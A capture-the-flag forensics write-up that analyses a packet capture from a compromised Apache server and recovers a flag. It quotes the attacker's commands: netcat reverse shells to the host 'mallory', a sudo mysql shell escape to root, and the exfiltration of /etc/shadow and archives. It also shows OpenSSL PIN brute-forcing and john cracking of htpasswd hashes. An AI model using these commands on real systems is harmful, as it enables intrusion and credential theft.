# Suspicious communication (5 points)

Hi, emergency troubleshooter,

one of our web servers has apparently been compromised, analyze what happened
from the record of recorded suspicious communication.

Stay grounded!

* [Download pcap for analysis](https://github.com/jandurovec/the-catch-2025/raw/refs/heads/main/suspicious-communications/suspicious_communication.zip)

## Solution

As the task suggests, we'll be playing with a `pcap` file, so we'll open it in
[Wireshark] after extraction.

If we inspect HTTP POST data (filter: `http.request.method == "POST"`) we will
see only a handful of requests, one of them posting a command to connect to
`mallory` host to port `42121` using `nc` to `/uploads/ws.php`. It seems that
someone delpoyed and exploited a webshell on our server to open a tunnel

```
POST /uploads/ws.php HTTP/1.1
Host: server-www
User-Agent: Mozilla/4.0  (compatible; MSIE 6.0; Windows NT 5.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 37
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWxpY2U6dGVzdGVy

c=nc+-e+%2Fbin%2Fsh+mallory+42121+%26
HTTP/1.1 200 OK
Date: Wed, 16 Jul 2025 08:06:40 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

If we find the related stream (`tcp.dstport == 42121`) and follow the
TCP stream (`tcp.stream eq 11678`) we can see

```
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a

Linux 2c1c649ff17d 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux

whoami

www-data

pwd

/var/www/html/uploads

df -h

Filesystem      Size  Used Avail Use% Mounted on
overlay          98G   44G   51G  47% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda2        98G   44G   51G  47% /shared
tmpfs           3.9G     0  3.9G   0% /proc/acpi
tmpfs           3.9G     0  3.9G   0% /sys/firmware

tar -zcf /tmp/html.tgz /var/www/html
cat /tmp/html.tgz | nc mallory 42122
sudo -l

Matching Defaults entries for www-data on 2c1c649ff17d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 2c1c649ff17d:
    (root) NOPASSWD: /usr/bin/mysql*

sudo /usr/bin/mysql -e '\! nc -e /bin/sh mallory 42123'
exit
```

This shows us that `html.tgz` has been sent to `mallory` on port `41222`, so
we can use the same technique to find the related stream and extract/save it
from the pcap dump (`tcp.dstport == 42122` -> `tcp.stream eq 11681`).

Similarly, we can inspect the communication on port `42123`
(`tcp.dstport == 42123` -> `tcp.stream eq 11682`).

```
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
tcpdump:x:102:104::/nonexistent:/usr/sbin/nologin
webmaster:x:1000:1000:,,,:/home/webmaster:/bin/bash

tar zcf /tmp/all.tgz /etc /root /home
curl -k -s https://mallory:42120/pincode/`hostname -f` > /tmp/secret
ls -alh /tmp

total 17M
drwxrwxrwt 1 root     root     4.0K Jul 16 08:07 .
drwxr-xr-x 1 root     root     4.0K Jul 16 08:05 ..
-rw-r--r-- 1 root     root      17M Jul 16 08:07 all.tgz
-rw------- 1 root     root      182 Jul 16 08:05 apache2-stderr---supervisor-gvzlqfqv.log
-rw------- 1 root     root        0 Jul 16 08:05 apache2-stdout---supervisor-l6ohlz0u.log
-rw-r--r-- 1 www-data www-data  46K Jul 16 08:07 html.tgz
-rw------- 1 root     root        0 Jul 16 08:05 mysqld_safe-stderr---supervisor-g6ruwbqj.log
-rw------- 1 root     root      135 Jul 16 08:05 mysqld_safe-stdout---supervisor-lct36jfa.log
drwxr-xr-x 2 root     root     4.0K Jul 16 08:05 output
-rw------- 1 root     root      131 Jul 16 08:05 pcap-stderr---supervisor-cl8n5_cp.log
-rw------- 1 root     root        0 Jul 16 08:05 pcap-stdout---supervisor-qrq22yby.log
-rw-r--r-- 1 root     root        6 Jul 16 08:07 secret

cat /etc/shadow | openssl enc -aes-256-cbc -e -a -salt -pbkdf2 -iter 10 -pass file:/tmp/secret | nc mallory 42124
cat /tmp/all.tgz | openssl enc -aes-256-cbc -e -a -salt -pbkdf2 -iter 10 -pass file:/tmp/secret | nc mallory 42125
exit
```

Doing the same for ports `42124` and `42125` should allow us to save encrypted
versions of `/etc/shadow` and `/tmp/all.tgz`.

I.e. at this point we should have the following files
* `html.tgz`
* `shadow.enc`
* `all.tgz.enc`

We also know that `/tmp/secret` was used to encrypt the data along with other
encryption parameters (10 iterations, salt,...). We do not know what that file
contained, but we can see it was retrieved from
`https://mallory:42120/pincode/<some hostname>`, so we can guess that PIN code
consists only of digits. The length is also known (in `ls` output), so we need
to guess a 6-digit PIN.

In addition to that, `/etc/shadow` has been encrypted using the same mechanism
and key, so we can find the key on much smaller file (i.e. faster) and then use
it to decrypt `all.tgz`.

The final hint/optimization is that since we're decrypting `/etc/shadow`, it is
very likely to start with `root`, so we should know after decrypting the first
four bytes whether we're on the right track.

To make this easier, we can use the [bruteforce-salted-openssl] utility, but
we'll need to convert the file from base64-encoded one that we downloaded to
binary first.

_Note: The only rant I have here is that the standard version packaged in kali
(1.4.2) does not contain the parameter to control iteration count, so we need
to download and build the latest one from GitHub._

```
$ base64 -d shadow.enc > shadow.bin
$ bruteforce-salted-openssl/bruteforce-salted-openssl -t 4 -K -i 10 -l 6 -m 6 -1 -p 4 -M root -s "0123456789" shadow.bin
Tried / Total passwords: 101522 / 1e+06
Tried passwords per second: 101522.000000
Last tried password: 101531
Total space searched: 10.152200%

Password candidate: 101525
```

With the PIN discovered, we can also decrypt `all.tgz`.

```
$ openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -iter 10 -pass pass:101525 -in all.tgz.enc -out all.tgz
```

After successful extraction of `all.tgz` we gain access to a lot of files.
`/etc/apache2/sites-enabled/tcc-ssl.conf` indicates that
`etc/ssl/private/ssl-cert-snakeoil.key` (i.e. default key) is used by Apache to
encrypt HTTPS communication.

We can [configure Wireshark][wireshark-tls] to use it to decrypt TLS.

Previously, we have also downloaded `html.tgz`, which contains the following:

```
$ tar tzvf html.tgz
drwxr-xr-x root/root         0 2025-07-16 10:05 var/www/html/
drwxr-xr-x www-data/www-data 0 2025-07-16 10:06 var/www/html/uploads/
-rw-r--r-- www-data/www-data 47 2025-07-16 10:06 var/www/html/uploads/ws.php
-rw-r--r-- root/root      70848 2025-07-16 10:05 var/www/html/filemanager.php
drwxr-xr-x root/root          0 2025-07-16 10:05 var/www/html/app/
drwxr-xr-x root/root          0 2025-07-16 10:05 var/www/html/app/css/
-rw-r--r-- root/root     160302 2025-07-16 10:05 var/www/html/app/css/bootstrap.min.css
drwxr-xr-x root/root          0 2025-07-16 10:05 var/www/html/app/templates/
-rw-r--r-- root/root        605 2025-07-16 10:05 var/www/html/app/templates/header.php
-rw-r--r-- root/root        228 2025-07-16 10:05 var/www/html/app/index.php
-rw-r--r-- root/root        224 2025-07-16 10:05 var/www/html/app/logout.php
-rw-r--r-- root/root        456 2025-07-16 10:05 var/www/html/app/admin.php
-rw-r--r-- root/root        606 2025-07-16 10:05 var/www/html/app/registered.php
-rw-r--r-- root/root       1426 2025-07-16 10:05 var/www/html/app/auth.php
-rw-r--r-- root/root        770 2025-07-16 10:05 var/www/html/app/backup.php
```

If we `grep` for occurrences of the flag, we can see that
`var/www/html/app/backup.php` is working with `/secrets/flag.txt`.

```php
<?php
require 'auth.php';
require_auth();

if (!is_admin()) {
    http_response_code(403);
    die('Access denied. Only admin can create backup.');
}

$flagPath = "/secrets/flag.txt";
$password = current_pass();

if (!file_exists($flagPath)) {
    die("Flag file not found.");
}

$flagData = file_get_contents($flagPath);

$iv = substr(hash('sha256', 'iv' . $password), 0, 16);
$key = hash('sha256', $password, true);

$encrypted = openssl_encrypt($flagData, 'aes-256-cbc', $key, 0, $iv);
if ($encrypted === false) {
    die("Encryption failed.");
}

// Nabídne soubor k downloadu
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="backup.enc"');
header('Content-Length: ' . strlen($encrypted));

echo $encrypted;
exit;
```

We can also explore the required `auth.php` to understand what password is
used for encryption, i.e., what is the result of the `current_pass()` method.

```php
<?php
session_start();

function require_auth() {
    if (!isset($_SESSION['user'])) {
        if (!isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {
            header('WWW-Authenticate: Basic realm="Internal Access"');
            header('HTTP/1.0 401 Unauthorized');
            echo 'Authentication required';
            exit;
        }

        $username = $_SERVER['PHP_AUTH_USER'];
        $password = $_SERVER['PHP_AUTH_PW'];

        if (verify_htpasswd($username, $password)) {
            $_SESSION['user'] = $username;
            $_SESSION['pass'] = $password;
        } else {
            header('HTTP/1.0 403 Forbidden');
            echo 'Invalid credentials.';
            exit;
        }
    }
}

function verify_htpasswd($user, $pass) {
    $lines = file('/etc/apache2/.htpasswd', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        list($ht_user, $hash) = explode(':', trim($line), 2);
        if ($ht_user === $user) {
            if (password_verify($pass, $hash)) {
                return true;
            } elseif (crypt($pass, $hash) === $hash) { // fallback for legacy crypt
                return true;
            }
        }
    }
    return false;
}

function current_user() {
    return $_SESSION['user'] ?? null;
}

function current_pass() {
    return $_SESSION['pass'] ?? null;
}

function is_admin() {
    return current_user() === 'admin';
}
```

These two files together tell us that the administrator (i.e., the user with
the username `admin`) is able to call this endpoint, and that the flag will be
encrypted using their password.

With the TLS key already configured in [Wireshark], we should see a call to
this endpoint (`http.request.uri contains "/app/backup"`), allowing us to
retrieve the encrypted flag (`tcp.stream eq 11673`).

_Note: Since this happened over HTTPS, we would not be able to see this without
the key extracted and configured above._

```
GET /app/backup.php HTTP/1.1
Host: server-www
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: PHPSESSID=63p364g32do6ks4284ee6kd276


HTTP/1.1 200 OK
Date: Wed, 16 Jul 2025 08:06:27 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="backup.enc"
Content-Length: 44
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/octet-stream

aOI32ayLIofLCXLWZtzmdY077Q1jcYUQof7GFBbOWHY=
```

(In)conveniently, the dump does not contain the login request for this user, so
we cannot just extract it from the HTTP Basic authentication headers. We'll
need to find the `admin` password (and then derive the decryption key from it)
another way.

The `all.tgz` archive retrieved earlier contains also `etc/apache2/.htpasswd`,
which we have not analyzed yet. This file contains the (hashes of) passwords
for users that are logging in to the web app, i.e. exactly those we're
interested in.

```
$ cat etc/apache2/.htpasswd
admin:$1$h7PCtM2Q$dE4Nxy0QaLT3kzyFoz54f.
alice:$1$avlK2Jg5$X7yCik3id/h8yv34Fn1Ri0
bob:$1$IbVRrZNw$zFE9jhxtdx1pHtXpryuGD/
carol:$1$7pgrfayT$ig8zFkSv8Etm3qVA.N/j61
```

We can use `john` to crack (some of) them.

```
$ john etc/apache2/.htpasswd
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
tester           (alice)
Bananas9         (admin)
Proceeding with incremental:ASCII
Session aborted
```

The file also contains `bob` and `carol`, but we're not interested in them, so
we can abort `john` once the password for `admin` is cracked.

Now we should have enough information to put together a simple PHP script to
decrypt the retrieved flag:

```php
<?php
  $password = 'Bananas9';
  $iv = substr(hash('sha256', 'iv' . $password), 0, 16);
  $key = hash('sha256', $password, true);
  $decrypted = openssl_decrypt('aOI32ayLIofLCXLWZtzmdY077Q1jcYUQof7GFBbOWHY=', 'aes-256-cbc', $key, 0, $iv);
  print("decrypted: $decrypted");
?>
```

Running the script finally yields the desired result:

```
$ php flag.php
decrypted: FLAG{kyAi-J2NA-n6nE-ZIX6}
```

[bruteforce-salted-openssl]: https://github.com/glv2/bruteforce-salted-openssl.git
[Wireshark]: https://www.wireshark.org/
[wireshark-tls]: https://wiki.wireshark.org/TLS#preference-settings
